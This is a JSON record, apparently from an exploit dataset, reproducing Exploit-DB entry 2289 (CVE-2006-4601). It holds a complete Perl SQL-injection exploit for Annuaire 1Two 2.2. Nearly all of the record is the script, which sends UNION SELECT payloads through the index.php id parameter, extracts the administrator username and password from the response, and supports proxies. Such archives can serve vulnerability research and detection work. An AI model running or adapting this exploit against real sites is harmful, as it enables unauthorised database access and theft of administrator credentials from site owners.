{
  "id": "2289",
  "title": "Annuaire 1Two 2.2 - SQL Injection",
  "cve": "CVE-2006-4601",
  "vuln_type": "sqli",
  "code": "#!/usr/bin/perl\r\n#\r\n# Affected.scr..: Annuaire 1Two 2.2\r\n# Poc.ID........: 09060902.txt\r\n# Type..........: SQL Injection (without quote)\r\n# Risk.level....: Medium\r\n# Vendor.Status.: Unpatched\r\n# Src.download..: http://www.1two.org/\r\n# Poc.link......: acid-root.new.fr/poc/09060902.txt\r\n# Credits.......: DarkFig\r\n#\r\n#\r\nuse LWP::UserAgent;\r\nuse HTTP::Request;\r\nuse Getopt::Long;\r\nuse strict;\r\n\r\n\r\nprint STDOUT \"\\n+\", '-' x 53, \"+\\n\";\r\nprint STDOUT \"|    Annuaire 1Two 2.2 Remote SQL Injection Exploit   |\\n\";\r\nprint STDOUT '+', '-' x 53, \"+\\n\";\r\n\r\nmy($host,$path,$proxh,$proxu,$proxp,);\r\nmy $opt = GetOptions(\r\n   'host=s'   =>  \\$host,\r\n   'path=s'   =>  \\$path,\r\n   'proxh=s'  =>  \\$proxh,\r\n   'proxu=s'  =>  \\$proxu,\r\n   'proxp=s'  =>  \\$proxp);\r\n   \r\nif(!$host) {\r\n    print STDOUT \"| Usage: ./xx.pl --host=[www] --path=[/] [Options]    |\\n\";\r\n    print STDOUT \"| [Options] --proxh=[ip] --proxu=[user] --proxp=[pwd] |\\n\";\r\n    print STDOUT '+', '-' x 53, \"+\\n\";\r\n    exit(0);\r\n}\r\n\r\nif(!$path) {$path  = '/';}\r\nif($host  !~ /http/) {$host  = 'http://'.$host;}\r\nif($proxh !~ /http/ && $proxh != '') {$proxh = 'http://'.$proxh.'/';}\r\n\r\nmy @fi = ('username', 'password');\r\nmy $ur = $host.$path.'index.php?id=';\r\nmy $ua = LWP::UserAgent->new();\r\n   $ua->agent('Mozilla XD');\r\n   $ua->timeout(30);\r\n   $ua->proxy(['http'] => $proxh) if $proxh;\r\n\r\nforeach(@fi) {\r\nmy $xx = $_;\r\nmy $re = HTTP::Request->new(GET =>  $ur.\"-1 UNION SELECT $xx FROM 1two_annuaire_admin\");\r\n   $re->proxy_authorization_basic($proxu, $proxp) if $proxp;\r\nmy $xd = $ua->request($re);\r\nmy $da = $xd->content;\r\n\r\nif($da =~ /- (.*?)<\\/title>/) {\r\n      if($xx eq 'username') {\r\n            print STDOUT \" [+]User:\";}\r\n      if($xx eq 'password') {\r\n            print STDOUT \" [+]Passwd:\";}\r\n      print STDOUT \" $1\\n\";\r\n} else {\r\n  print STDOUT \"[!]Exploit failed\\n\";\r\n}}\r\nprint STDOUT \"+\", '-' x 53, \"+\\n\";\r\nexit(0);\r\n\r\n# milw0rm.com [2006-09-02]",
  "url": "https://www.exploit-db.com/exploits/2289"
}